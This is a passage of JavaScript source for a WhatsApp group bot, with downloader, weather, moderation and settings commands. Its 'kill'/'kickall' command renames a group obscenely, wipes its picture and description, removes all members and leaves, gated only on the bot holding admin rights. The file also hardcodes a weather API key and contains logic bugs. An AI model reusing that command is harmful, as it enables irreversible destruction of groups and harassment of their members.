        redeployApp();
    }
	break;
        
        case 'video': {
  try {
    if (!text) return reply('What video do you want to download?');

    let videoUrl = '';
    let videoTitle = '';
    let videoThumbnail = '';

    if (text.startsWith('http://') || text.startsWith('https://')) {
      videoUrl = text;
    } else {
      const { videos } = await yts(text);
      if (!videos || videos.length === 0) return reply('No videos found!');
      videoUrl = videos[0].url;
      videoTitle = videos[0].title;
      videoThumbnail = videos[0].thumbnail;
    }

    const izumi = {
      baseURL: "https://izumiiiiiiii.dpdns.org"
    };

    const AXIOS_DEFAULTS = {
      timeout: 60000,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*'
      }
    };

    const tryRequest = async (getter, attempts = 3) => {
      let lastError;
      for (let attempt = 1; attempt <= attempts; attempt++) {
        try {
          return await getter();
        } catch (err) {
          lastError = err;
          if (attempt < attempts) {
            await new Promise(r => setTimeout(r, 1000 * attempt));
          }
        }
      }
      throw lastError;
    };

    const getIzumiVideoByUrl = async (youtubeUrl) => {
      const apiUrl = `${izumi.baseURL}/downloader/youtube?url=${encodeURIComponent(youtubeUrl)}&format=720`;
      const res = await tryRequest(() => axios.get(apiUrl, AXIOS_DEFAULTS));
      if (res?.data?.result?.download) return res.data.result;
      throw new Error('Izumi video API returned no download');
    };

    const getOkatsuVideoByUrl = async (youtubeUrl) => {
      const apiUrl = `https://okatsu-rolezapiiz.vercel.app/downloader/ytmp4?url=${encodeURIComponent(youtubeUrl)}`;
      const res = await tryRequest(() => axios.get(apiUrl, AXIOS_DEFAULTS));
      if (res?.data?.result?.mp4) {
        return {
          download: res.data.result.mp4,
          title: res.data.result.title
        };
      }
      throw new Error('Okatsu API returned no mp4');
    };

    // Send thumbnail
    try {
      const ytId = (videoUrl.match(/(?:youtu\.be\/|v=)([a-zA-Z0-9_-]{11})/) || [])[1];
      const thumb = videoThumbnail || (ytId ? `https://i.ytimg.com/vi/${ytId}/sddefault.jpg` : undefined);
      const captionTitle = videoTitle || text;

      if (thumb) {
        await trashcore.sendMessage(m.chat, {
          image: { url: thumb },
          caption: `*${captionTitle}*\n> _🏂searching video data..._`,
        }, { quoted: m });
      }
    } catch (e) {
      console.error('[VIDEO] Thumbnail Error:', e?.message || e);
    }

    // Validate YouTube URL
    const urls = videoUrl.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/gi);
    if (!urls) return reply('This is not a valid YouTube link!');

    // Try downloading video
    let videoData;
    try {
      videoData = await getIzumiVideoByUrl(videoUrl);
    } catch (e1) {
      console.warn('[VIDEO] Izumi failed, trying Okatsu:', e1?.message || e1);
      videoData = await getOkatsuVideoByUrl(videoUrl);
    }

    await trashcore.sendMessage(m.chat, {
      video: { url: videoData.download },
      mimetype: 'video/mp4',
      fileName: `${videoData.title || videoTitle || 'video'}.mp4`,
      caption: `*${videoData.title || videoTitle || 'Video'}*`,
    }, { quoted: m });

  } catch (error) {
    console.error('[VIDEO] Command Error:', error?.message || error);
    reply('Download failed: ' + (error?.message || 'Unknown error'));
  }
  break;
}
//==================================================//        
   case 'weather': {
		      try {

if (!text) return reply("provide a city/town name");

const response = await fetch(`http://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=1ad47ec6172f19dfaf89eb3307f74785`);
        const data = await response.json();

console.log("Weather data:",data);

        const cityName = data.name;
        const temperature = data.main.temp;
        const feelsLike = data.main.feels_like;
        const minTemperature = data.main.temp_min;
        const maxTemperature = data.main.temp_max;
        const description = data.weather[0].description;
        const humidity = data.main.humidity;
        const windSpeed = data.wind.speed;
        const rainVolume = data.rain ? data.rain['1h'] : 0;
        const cloudiness = data.clouds.all;
        const sunrise = new Date(data.sys.sunrise * 1000);
        const sunset = new Date(data.sys.sunset * 1000);

await m.reply(`❄️ Weather in ${cityName}

🌡️ Temperature: ${temperature}°C
📝 Description: ${description}
❄️ Humidity: ${humidity}%
🌀 Wind Speed: ${windSpeed} m/s
🌧️ Rain Volume (last hour): ${rainVolume} mm
☁️ Cloudiness: ${cloudiness}%
🌄 Sunrise: ${sunrise.toLocaleTimeString()}
🌅 Sunset: ${sunset.toLocaleTimeString()}`);

} catch (e) { reply("Unable to find that location.") }
  }
   break;
//==================================================//        
  case 'gitclone': {
		      if (!text) return m.reply(`Where is the link?`)
if (!text.includes('github.com')) return reply(`Is that a GitHub repo link ?!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user3, repo] = text.match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user3}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    await trashcore.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply("error"))

		    }
		      break; //==================================================//     
        case 'uptime':
  const uptime = process.uptime();
  const days = Math.floor(uptime / (24 * 3600));
  const hours = Math.floor((uptime % (24 * 3600)) / 3600);
  const minutes = Math.floor((uptime % 3600) / 60);
  const seconds = Math.floor(uptime % 60);
  trashcore.sendMessage(m.chat, { text: `Uptime: ${days}d ${hours}h ${minutes}m ${seconds}s` });
  break;
//==================================================//           
      case 'ping':
  const start = Date.now();
  const msg = await m.reply('Pinging...');
  const end = Date.now();
  const latency = end - start;
  m.reply(`Pong! Latency: ${latency}ms`);
  break; //==================================================//      
    case 'yts': case 'ytsearch': {
                if (!text) return reply(`Example : ${prefix + command} faded`)
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `❤️ No : ${no++}\n❤️Type : ${i.type}\n ❤️Video ID : ${i.videoId}\n❤️ Title : ${i.title}\n❤️ Views : ${i.views}\n❤️ Duration : ${i.timestamp}\n❤️ Uploaded : ${i.ago}\n❤️ Url : ${i.url}\n\n─────────────────\n\n`
                }
                trashcore.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break  
        
        case 'shorturl': {
const zlib = require('zlib');
const qs = require('querystring');      
const kualatshort = async (url) => {
  const res = await axios.post(
    'https://kua.lat/shorten',
    qs.stringify({ url }),
    {
      responseType: 'arraybuffer',
      headers: {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'id-ID,id;q=0.9,en-AU;q=0.8,en;q=0.7,en-US;q=0.6',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://kua.lat',
        'Referer': 'https://kua.lat/',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest'
      }
    }
  )

  let decoded
  const encoding = res.headers['content-encoding']

  if (encoding === 'br') {
    decoded = zlib.brotliDecompressSync(res.data)
  } else if (encoding === 'gzip') {
    decoded = zlib.gunzipSync(res.data)
  } else if (encoding === 'deflate') {
    decoded = zlib.inflateSync(res.data)
  } else {
    decoded = res.data
  }

  return JSON.parse(decoded.toString())
}
  
    try {
      if (!text) return m.reply('Use : .shorturl https://example.com')
      
      const result = await kualatshort(text)

      if (!result?.data?.shorturl) {
        return m.reply('failed to create url.')
      }

      reply(`🔗 *Short URL:*\n${result.data.shorturl}`)
    } catch (e) {
      console.error('[SHORTURL] Error:', e)
      reply(`Error: ${e.message}`)
    }
    break
  }
       
//==================================================//  
case 'goodbye': {
  if (!m.isGroup) return reply(mess.owner)
  if (!isAdmins) return reply(mess.admin)
  if (args[0] === "on") {
    if (db.data.chats[m.chat].goodbye) return reply('Already activated previously')
    db.data.chats[m.chat].goodbye = true
    reply('Successfully activated goodbye!')
  } else if (args[0] === "off") {
    if (!db.data.chats[m.chat].goodbye) return reply('Already deactivated previously')
    db.data.chats[m.chat].goodbye = false
    reply('Successfully deactivated goodbye!')
  } else {
    reply('Command not recognized. Use "on" to activate or "off" to deactivate.')
  }
}
break;              
//==================================================//           
        case 'setprefix':
                if (!trashown) return reply (mess.owner)
                if (!text) return reply(`Example : ${prefix + command} desired prefix`)
                global.xprefix = text
                reply(`Prefix successfully changed to ${text}`)
                break
//==================================================//              
        case "desc": case "setdesc": { 
                 if (!m.isGroup) return reply (mess.group)
                 if (!isAdmins) return reply ("bot must be admin in this group")
                 if (!text) throw 'Provide the text for the group description' 
                 await trashcore.groupUpdateDescription(m.chat, text); 
 m.reply('Group description successfully updated! 🥶'); 
             } 
 break; 
//==================================================//      
 case 'save': {
  try {
    const quotedMessage = m.msg?.contextInfo?.quotedMessage;
    
    // Check if user quoted a message
    if (!quotedMessage) {
      return m.reply('❌ Please reply to a status message');
    }
    
    // Verify it's a status message
    if (!m.quoted?.chat?.endsWith('@broadcast')) {
      return m.reply('⚠️ That message is not a status! Please reply to a status message.');
    }
    
    // Download the media first
    const mediaBuffer = await trashcore.downloadMediaMessage(m.quoted);
    if (!mediaBuffer || mediaBuffer.length === 0) {
      return m.reply('🚫 Could not download the status media. It may have expired.');
    }
    
    // Determine media type and prepare payload
    let payload;
    let mediaType;
    
    if (quotedMessage.imageMessage) {
      mediaType = 'image';
      payload = {
        image: mediaBuffer,
        caption: quotedMessage.imageMessage.caption || '📸 Saved status image',
        mimetype: 'image/jpeg'
      };
    } 
    else if (quotedMessage.videoMessage) {
      mediaType = 'video';
      payload = {
        video: mediaBuffer,
        caption: quotedMessage.videoMessage.caption || '🎥 Saved status video',
        mimetype: 'video/mp4'
      };
    } 
    else {
      return m.reply('❌ Only image and video statuses can be saved!');
    }
    
    // Send to user's DM
    await trashcore.sendMessage(
      m.sender, 
      payload,
      { quoted: m }
    );
    
    // Confirm in chat
    return m.reply(`✅  ${mediaType} 𝚅𝙴𝙽𝙾𝙼-𝚇𝙼𝙳 is on fire 🔥!`);
    
  } catch (error) {
    console.error('Save error:', error);
    if (error.message.includes('404') || error.message.includes('not found')) {
      return m.reply('⚠️ The status may have expired or been deleted.');
    }
    return m.reply('❌ Failed to save status. Error: ' + error.message);
  }
}
break;
//==================================================//     
        case "disp-90": { 
                 if (!m.isGroup) return reply (mess.group); 
                 
                 if (!isAdmins) return reply (mess.admin); 
  
                     await trashcore.groupToggleEphemeral(m.chat, 90*24*3600); 
 m.reply('Dissapearing messages successfully turned on for 90 days!'); 
 } 
 break; 
//==================================================//         
        case "disp-off": { 
                 if (!m.isGroup) return reply (mess.group); 
             
                 if (!isAdmins) return reply (mess.admin); 
  
                     await trashcore.groupToggleEphemeral(m.chat, 0); 
 m.reply('Dissapearing messages successfully turned off!'); 
 }
   break;
       
//==================================================//  
        case "disp-1": { 
                 if (!m.isGroup) return reply (mess.group); 
                
                 if (!isAdmins) return reply (mess.admin); 
  
                     await trashcore.groupToggleEphemeral(m.chat, 1*24*3600); 
 m.reply('Dissapearing messages successfully turned on for 24hrs!'); 
 } 
 break; 
//==================================================//  
case 'autotyping':
if (!trashown) return reply(mess.owner)
if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].autoTyping = true
reply(`Successfully Changed Auto Typing To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].autoTyping = false
reply(`Successfully Changed Auto Typing To ${q}`)
}
break
//==================================================//       
        case 'onlygroup':
case 'onlygc':
if (!trashown) return reply(mess.owner)
if (args.length < 1) return reply(`Example ${prefix + command} on / off`)
if (q == 'on') {
db.data.settings[botNumber].onlygrub = true
reply(`Successfully Changed Onlygroup To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].onlygrub = false
reply(`Successfully Changed Onlygroup To ${q}`)
}
break
//==================================================//             
case 'onlypc':
if (!trashown) return reply(mess.owner)
if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].onlypc = true
reply(`Successfully Changed Onlypc To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].onlypc = false
reply(`Successfully Changed Onlypc To ${q}`)
}
break
//==================================================//      
       case 'unavailable':
                if (!trashown) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    db.data.settings[botNumber].online = true
                    reply(`Successfully changed unavailable to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].online = false
                    reply(`Successfully changed unavailable to ${q}`)
                }
            break
        
        
//==================================================//           
        case 'antilink': {
               if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !trashown) return reply(mess.admins)
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antilink = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilink = false
                  reply(`${command} is disabled`)
               }
            }
            break
//==================================================//       
        case 'antilinkgc': {
               if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins && !trashown) return m.reply(mess.owner)
               if (args.length < 1) return m.reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antilinkgc = true
                  m.reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilinkgc = false
                  m.reply(`${command} is disabled`)
               }
            }
            break
        
                
                
                
//==================================================//      
        case 'autoswview':
    case 'autostatusview':{
             if (!trashown) return (mess.owner)
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  statusview = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  statusview= false
                  reply(`${command} is disabled`)
               }
            }
            break
//==================================================//        
        case 'unwarning':
    case 'unwarn': {
      if (!m.isGroup) return reply(mess.owner)
      if (!isAdmins) return reply(mess.admin)
      

      let users = m.mentionedJid[0] ?
        m.mentionedJid[0] :
        m.quoted ?
        m.quoted.sender :
        text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

      if (!users) return reply(`Tag/Reply target${command}`)
      if (trashown) return reply('feature reserved for owner or sudo numbers only')

      if (!db.data.chats[m.chat].warn) db.data.chats[m.chat].warn = {}

      if (!db.data.chats[m.chat].warn[users] || db.data.chats[m.chat].warn[users] === 0) {
        return reply(`User is already in the warning list.`)
      }

      db.data.chats[m.chat].warn[users] -= 1

      const sisa = db.data.chats[m.chat].warn[users]

      trashcore.sendTextWithMentions(m.chat, `✅ Success *${command}* @${users.split('@')[0]}\nRemoved Warning: ${sisa}/${setting.warnCount}`, m)
      if (db.data.chats[m.chat].warn[users] === 0) {
        delete db.data.chats[m.chat].warn[m.sender];
      }
    }
    break
        case 'ch': {
  try {
    const carouselCards = [
      {
        image: trashpic,                          
        
        title: "Card 1",
        description: "This is card 1",
        id: "card_1"
      },
      {
        image: trashpic,
        title: "Card 2",
        description: "This is card 2",
        id: "card_2"
      },
      {
        image: trashpic,                        
        
        title: "Card 3",
        description: "This is card 3",
        id: "card_3"
      }
    ];

    const cards = carouselCards.map(card => ({
      image: {
        link: card.image
      },
      title: card.title,
      subtitle: card.description
    }));

    await trashcore.relayMessage(from, {
      template: {
        type: "media",
        media: {
          type: "image",
          image: {
            link: cards[0].image.link
          }
        },
        carousel: cards
      }
    }, { quoted: m });

  } catch (error) {
    console.error("Error sending carousel:", error);
  }
}
break;
//==================================================//   
        
case 'take': {
const { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter');

if(!msgR) return reply('Quote an image, a short video or a sticker to change watermark.'); 

let media;
if (m.imageMessage) {
     media = msgR.imageMessage
  } else if(msgR.videoMessage) {
media = args.join(" ").videoMessage
  } 
  else if (msgR.stickerMessage) {
    media = msgR.stickerMessage ;
  } else {
    reply('This is neither a sticker, image nor a video...'); return
  } ;

var result = await trashcore.downloadAndSaveMediaMessage(media);

let stickerResult = new Sticker(result, {
            pack: pushname,
            author: pushname,
            type: StickerTypes.FULL,
            categories: ["🤩", "🎉"],
            id: "12345",
            quality: 70,
            background: "transparent",
          });
const Buffer = await stickerResult.toBuffer();
          trashcore.sendMessage(m.chat, { sticker: Buffer }, { quoted: m });

}
break;
//==================================================//   
        case 'warning':
    case 'warn': {
      if (!m.isGroup) reply(mess.group)
      if (!isAdmins) reply(mess.admin)

      let users = m.mentionedJid[0] ?
        m.mentionedJid[0] :
        m.quoted ?
        m.quoted.sender :
        text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

      if (!users) return reply(`Tag/Reply target with${command}`)
      if (!trashown) return reply('feature reserved for owner or sudo numbers only')

      if (!db.data.chats[m.chat].warn) db.data.chats[m.chat].warn = {}
      db.data.chats[m.chat].warn[users] = (db.data.chats[m.chat].warn[users] || 0) + 1

      const total = db.data.chats[m.chat].warn[users]

      trashcore.sendTextWithMentions(m.chat, `⚠️ Success *${command}* @${users.split('@')[0]}\nTotal Warning: ${total}/3`, m)

      if (total >= setting.warnCount) {
        if (!isAdmins) return

        await trashcore.sendMessage(m.chat, {
          text: `🚫 @${users.split('@')[0]} your ${total}/${setting.warnCount} warning is on count.`,
          mentions: [users]
        })

        await trashcore.groupParticipantsUpdate(m.chat, [users], 'remove')
        delete db.data.chats[m.chat].warn[users]
      }
    }
    break

//==================================================//      
        case 'autorecord':
if (!trashown) return reply(mess.owner)
if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].autoRecord = true
reply(`Successfully Changed Auto Record To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].autoRecord = false
reply(`Successfully Changed Auto Record To ${q}`)
}
break;
        
//==================================================//      
        case 'autobio':
if (!trashown) return reply(mess.owner)
if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].autobio = true
reply(`Successfully Changed Auto Bio To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].autobio = false
reply(`Successfully Changed Auto Bio To ${q}`)
}
break
//==================================================//
case "dev":
case "devoloper":
case "owner":
case "xowner": {
  let namaown = `𝙳𝙰𝚅𝙴`
  let NoOwn = `254104260236`
  var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
    contactMessage: {
      displayName: namaown,
      vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${NoOwn}:+${NoOwn}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:The Nasty Dev🐉\nX-WA-BIZ-NAME:[[ ༑ 𝐙.𝐱.𝐕 ⿻ 𝐏𝐔𝐁𝐋𝐢𝐂 ༑ ]]\nEND:VCARD`
    }
  }), {
    userJid: m.chat,
    quoted: fkontak
  })
  trashcore.relayMessage(m.chat, contact.message, {
    messageId: contact.key.id
  })
}
break;
//==================================================//
case "invite": case "linkgc": { 
                 if (!m.isGroup) return reply(mess.group); 
                
                 let response = await trashcore.groupInviteCode(m.chat); 
                 trashcore.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup link for  ${groupMetadata.subject}`, m, { detectLink: true }); 
             } 
          break;
//==================================================//
case "close": {
if (!m.isGroup) return reply(mess.group)
if (!trashown) return reply(mess.owner)
await trashcore.groupSettingUpdate(m.chat, 'announcement')
reply("Success closed group chat,all members are not allowed to chat for now")
}
break
//==================================================//
case "open": {
if (!m.isGroup) return reply(mess.group)
if (!trashown) return reply(mess.owner)
await trashcore.groupSettingUpdate(m.chat, 'not_announcement')
reply("Success opened group chat,all members can send messages in group now")
}
break
//==================================================//
case 'tagall': {
      if (!m.isGroup) return (mess.group)
      if (!trashown && !isAdmins) return reply(mess.owner)
      let teks = `*👥 Tag All By Admin*

@${m.chat}
 
Message: ${q ? q : 'no message'}`
      trashcore.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
          mentionedJid: participants.map(a => a.id),
          groupMentions: [{
            groupJid: m.chat,
            groupSubject: "everyone"
          }]
        }
      }, {
        quoted: m
      })
    }
    break
//==================================================//
        case 'playdoc':{
const axios = require('axios');
const yts = require("yt-search");
const ffmpeg = require("fluent-ffmpeg");
const fs = require("fs");
const path = require("path");

  try {
    if (!text) return reply("What song do you want to download?");

    let search = await yts(text);
    let link = search.all[0].url;

    const apis = [
      `https://xploader-api.vercel.app/ytmp3?url=${link}`,
      `https://apis.davidcyriltech.my.id/youtube/mp3?url=${link}`,
      `https://api.ryzendesu.vip/api/downloader/ytmp3?url=${link}`,
      `https://api.dreaded.site/api/ytdl/audio?url=${link}`
       ];

    for (const api of apis) {
      try {
        let data = await fetchJson(api);

        // Checking if the API response is successful
        if (data.status === 200 || data.success) {
          let videoUrl = data.result?.downloadUrl || data.url;
          let outputFileName = `${search.all[0].title.replace(/[^a-zA-Z0-9 ]/g, "")}.mp3`;
          let outputPath = path.join(__dirname, outputFileName);

          const response = await axios({
            url: videoUrl,
            method: "GET",
            responseType: "stream"
          });

          if (response.status !== 200) {
            reply("sorry but the API endpoint didn't respond correctly. Try again later.");
            continue;
          }
		ffmpeg(response.data)
            .toFormat("mp3")
            .save(outputPath)
            .on("end", async () => {
            const { title, format, url: audioUrl } = data.result;
await reply(`downloading song ${title}`);
              await trashcore.sendMessage(
                m.chat,
                {
                  document: { url: outputPath },
                  mimetype: "audio/mp3",
		  caption: "`𝙳𝙰𝚅𝙴-𝙼𝙳`",
                  fileName: outputFileName,
                },
                { quoted: qtext }
              );
              fs.unlinkSync(outputPath);
            })
            .on("error", (err) => {
              reply("Download failed\n" + err.message);
            });

          return;
        }
      } catch (e) {
        // Continue to the next API if one fails
        continue;
      }
   }

    // If no APIs succeeded
    reply("An error occurred. All APIs might be down or unable to process the request.");
  } catch (error) {
    reply("Download failed\n" + error.message);
  }
}
	  break;

                
        
//==================================================//
case 'h':
case 'hidetag': {
if (!m.isGroup) return reply(mess.group)
if (!trashown) return reply(mess.owner)
if (m.quoted) {
trashcore.sendMessage(m.chat, {
forward: m.quoted.fakeObj,
mentions: participants.map(a => a.id)
})
}
if (!m.quoted) {
trashcore.sendMessage(m.chat, {
text: q ? q : '',
mentions: participants.map(a => a.id)
}, {
quoted: m
})
}
}
break
//==================================================//  
        case 'welcome': {
  if (!m.isGroup) return reply(mess.group)
  if (!isAdmins) return reply(mess.admin)
  if (args[0] === "on") {
    if (db.data.chats[m.chat].welcome) return reply('Already activated previously')
    db.data.chats[m.chat].welcome = true
    reply('Successfully activated welcome!')
  } else if (args[0] === "off") {
    if (!db.data.chats[m.chat].welcome) return reply('Already deactivated previously')
    db.data.chats[m.chat].welcome = false
    reply('Successfully deactivated welcome!')
  } else {
    reply('Command not recognized. Use "on" to activate or "off" to deactivate.')
  }
}
break;
//==================================================//
case 'kick': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins) return reply("bot must be admin first")
if (!trashown) return reply(mess.owner)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await trashcore.groupParticipantsUpdate(m.chat, [users], 'remove')
reply(`Sukses kick @${users.split('@')[0]}`)
}
break
//==================================================//
case "kill": 
case "kickall": {
	  if (!m.isGroup) return reply(mess.group)          
 if (!isAdmins) return reply(`bot is not admin in the group`)
          let raveni = participants.filter(_0x5202af => _0x5202af.id != trashcore.decodeJid(trashcore.user.id)).map(_0x3c0c18 => _0x3c0c18.id);
		      
          reply("Initializing Kill command💀...");
      
      await trashcore.removeProfilePicture(m.chat);
      await trashcore.groupUpdateSubject(m.chat, "Xxx Videos Hub");
      await trashcore.groupUpdateDescription(m.chat, "//This group is no longer available 🥹!");
      
	
          setTimeout(() => {
            trashcore.sendMessage(m.chat, {
              'text': "All parameters are configured, and Kill command has been initialized and confirmed✅️. Now, all " + raveni.length + " group participants will be removed in the next second.\n\nGoodbye Everyone 👋\n\nTHIS PROCESS IS IRREVERSIBLE ⚠️"
            }, {
              'quoted': m
            });
            setTimeout(() => {
              trashcore.groupParticipantsUpdate(m.chat, raveni, "remove");
              setTimeout(() => {
                reply("Succesfully removed All group participants✅️.\n\nGoodbye group owner 👋, its too cold in here 🥶.");
trashcore.groupLeave(m.chat);	      
              }, 1000);
            }, 1000);
          }, 1000);
        };	      
          break;
//==================================================//
case "promote": case "promot": {
if (!m.isGroup) return reply(`for group only`)
if (!isAdmins && !trashown) return m.reply(`Command reserved for group admins only`)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await trashcore.groupParticipantsUpdate(m.chat, [target], 'promote').then((res) => reply(`User ${target.split("@")[0]} is now an admin`)).catch((err) => reply(err.toString()))
} else return reply('Example: 254XXX/@tag')}
break
//==================================================//
case "demote": case "dismiss": {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !trashown) return m.reply(mess.admin)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await trashcore.groupParticipantsUpdate(m.chat, [target], 'demote').then((res) => reply(`Member ${target.split("@")[0]} is no longer an admin in this group`)).catch((err) => reply(err.toString()))
} else return reply('example:254XX')}
break
//==================================================//
case "close": {
if (!m.isGroup) return reply(mess.group)
if (!trashown) return reply(mess.owner)
await trashcore.groupSettingUpdate(m.chat, 'announcement')
reply("Success closed group chat,all members are not allowed to chat for now")
}
break
//==================================================//
case "open": {
if (!m.isGroup) return reply(mess.group)
if (!trashown) return reply(mess.owner)
await trashcore.groupSettingUpdate(m.chat, 'not_announcement')
reply("Success opened group chat,all members can send messages in group now")
}
break
//==================================================//      
        case "fixtures": case "matches": {
 try {
        let pl, laliga, bundesliga, serieA, ligue1;

        const plData = await fetchJson('https://api.dreaded.site/api/matches/PL');
        pl = plData.data;

        const laligaData = await fetchJson('https://api.dreaded.site/api/matches/PD');
        laliga = laligaData.data;

        const bundesligaData = await fetchJson('https://api.dreaded.site/api/matches/BL1');
        bundesliga = bundesligaData.data;

        const serieAData = await fetchJson('https://api.dreaded.site/api/matches/SA');
        serieA = serieAData.data;

        const ligue1Data = await fetchJson('https://api.dreaded.site/api/matches/FR');
        ligue1 = ligue1Data.data;

        let message = `𝗧𝗼𝗱𝗮𝘆𝘀 𝗙𝗼𝗼𝘁𝗯𝗮𝗹𝗹 𝗙𝗶𝘅𝘁𝘂𝗿𝗲𝘀 ⚽\n\n`;

        message += typeof pl === 'string' ? `🇬🇧 𝗣𝗿𝗲𝗺𝗶𝗲𝗿 𝗟𝗲𝗮𝗴𝘂𝗲:\n${pl}\n\n` : pl.length > 0 ? `🇬🇧 𝗣𝗿𝗲𝗺𝗶𝗲𝗿 𝗟𝗲𝗮𝗴𝘂𝗲:\n${pl.map(match => {
            const { game, date, time } = match;
            return `${game}\nDate: ${date}\nTime: ${time} (EAT)\n`;
        }).join('\n')}\n\n` : "🇬🇧 𝗣𝗿𝗲𝗺𝗶𝗲𝗿 𝗟𝗲𝗮𝗴𝘂𝗲: No matches scheduled\n\n";

        if (typeof laliga === 'string') {
            message += `🇪🇸 𝗟𝗮 𝗟𝗶𝗴𝗮:\n${laliga}\n\n`;
        } else {
            message += laliga.length > 0 ? `🇪🇸 𝗟𝗮 𝗟𝗶𝗴𝗮:\n${laliga.map(match => {
                const { game, date, time } = match;
                return `${game}\nDate: ${date}\nTime: ${time} (EAT)\n`;
            }).join('\n')}\n\n` : "🇪🇸 𝗟𝗮 𝗟𝗶𝗴𝗮: No matches scheduled\n\n";
        }

        message += typeof bundesliga === 'string' ? `🇩🇪 𝗕𝘂𝗻𝗱𝗲𝘀𝗹𝗶𝗴𝗮:\n${bundesliga}\n\n` : bundesliga.length > 0 ? `🇩🇪 𝗕𝘂𝗻𝗱𝗲𝘀𝗹𝗶𝗴𝗮:\n${bundesliga.map(match => {
            const { game, date, time } = match;
            return `${game}\nDate: ${date}\nTime: ${time} (EAT)\n`;
        }).join('\n')}\n\n` : "🇩🇪 𝗕𝘂𝗻𝗱𝗲𝘀𝗹𝗶𝗴𝗮: No matches scheduled\n\n";

        message += typeof serieA === 'string' ? `🇮🇹 𝗦𝗲𝗿𝗶𝗲 𝗔:\n${serieA}\n\n` : serieA.length > 0 ? `🇮🇹 𝗦𝗲𝗿𝗶𝗲 𝗔:\n${serieA.map(match => {
            const { game, date, time } = match;
            return `${game}\nDate: ${date}\nTime: ${time} (EAT)\n`;
        }).join('\n')}\n\n` : "🇮🇹 𝗦𝗲𝗿𝗶𝗲 𝗔: No matches scheduled\n\n";

        message += typeof ligue1 === 'string' ? `🇫🇷 𝗟𝗶𝗴𝘂𝗲 1:\n${ligue1}\n\n` : ligue1.length > 0 ? `🇫🇷 𝗟𝗶𝗴𝘂𝗲 1:\n${ligue1.map(match => {
            const { game, date, time } = match;
            return `${game}\nDate: ${date}\nTime: ${time} (EAT)\n`;
        }).join('\n')}\n\n` : "🇫🇷 𝗟𝗶𝗴𝘂𝗲- 1: No matches scheduled\n\n";

        message += "𝗧𝗶𝗺𝗲 𝗮𝗻𝗱 𝗗𝗮𝘁𝗲 𝗮𝗿𝗲 𝗶𝗻 𝗘𝗮𝘀𝘁 𝗔𝗳𝗿𝗶𝗰𝗮 𝗧𝗶𝗺𝗲𝘇𝗼𝗻𝗲 (𝗘𝗔𝗧).";

        await m.reply(message);
    } catch (error) {
        m.reply('Something went wrong. Unable to fetch matches.' + error);
    }
};
break;		      
//==================================================//
 
    
        
      
//==================================================//     
     case 'request': 
case 'suggest': {
  if (!text) return reply(`Example : ${prefix + command} hi dev play command is not working`)
  let textt = `*| REQUEST/SUGGESTION |*`
